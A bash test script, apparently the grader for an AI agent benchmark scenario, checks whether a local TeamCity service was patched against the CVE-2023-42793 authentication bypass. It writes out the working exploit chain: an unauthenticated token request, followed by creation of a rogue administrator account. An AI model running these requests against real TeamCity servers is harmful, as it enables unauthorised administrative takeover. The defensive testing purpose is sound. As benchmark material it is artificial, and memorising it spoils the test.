#!/bin/bash
# Scenario 16: TeamCity auth-bypass -> admin token -> RCE (SIMULATION of
# CVE-2023-42793). Ground truth is BEHAVIOURAL against the LIVE service: the real
# exploit chain (mint an admin token unauthenticated, then use it to create a new
# administrator) must SUCCEED at baseline and be BLOCKED after the fix. A
# do-nothing agent leaves the chain working.
set -u
IP=$(hostname -i 2>/dev/null | awk '{print $1}')
[ -z "$IP" ] && IP=127.0.0.1
B="http://$IP:8111"

code_of() { curl -s -m 5 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null || echo 000; }

# Wait for the service (do NOT start it — a dead daemon fails).
UP=0
for i in $(seq 1 20); do
    [ "$(code_of "$B/")" != "000" ] && { UP=1; break; }
    sleep 2
done
[ "$UP" = "1" ] || { echo "FAIL [Regression]: nothing serving on 8111 (dead / not started)." >&2; exit 1; }

ROGUE="hv_rogue_admin"

###############################################################################
# PoC: run the REAL auth-bypass -> privileged-action chain.
#   1) mint an admin token WITHOUT authentication
#   2) use the token to create a new administrator
#   3) confirm the new administrator now exists in server state
###############################################################################
TOKRESP=$(curl -s -m 5 -X POST "$B/app/rest/users/id:1/tokens/RPC2" 2>/dev/null || true)
TOKEN=$(printf '%s' "$TOKRESP" | grep -oE '[0-9a-f]{32}' | head -1)

if [ -n "$TOKEN" ]; then
    curl -s -m 5 -X POST "$B/app/rest/users" \
        -H "Authorization: Bearer $TOKEN" \
        --data "username=$ROGUE" >/dev/null 2>&1 || true
fi

USERSLIST=$(curl -s -m 5 "$B/app/rest/users" 2>/dev/null || true)
if printf '%s' "$USERSLIST" | grep -q "$ROGUE"; then
    echo "FAIL [PoC]: unauth token minted and used to create admin '$ROGUE' — CVE-2023-42793 exploitable (state: $USERSLIST)." >&2
    exit 1
fi
if [ -n "$TOKEN" ]; then
    echo "PASS [PoC]: token minted but privileged action denied; admin set unchanged ($USERSLIST)."
else
    echo "PASS [PoC]: unauth token generation refused; admin set unchanged ($USERSLIST)."
fi

###############################################################################
# Regression: the TeamCity web UI must still respond.
###############################################################################
for i in 1 2 3 4 5; do
    if [ "$(code_of "$B/")" = "200" ]; then
        echo "PASS [Regression]: TeamCity UI reachable on 8111 (HTTP 200)."
        exit 0
    fi
    sleep 2
done
echo "FAIL [Regression]: TeamCity UI not reachable on 8111." >&2
exit 1
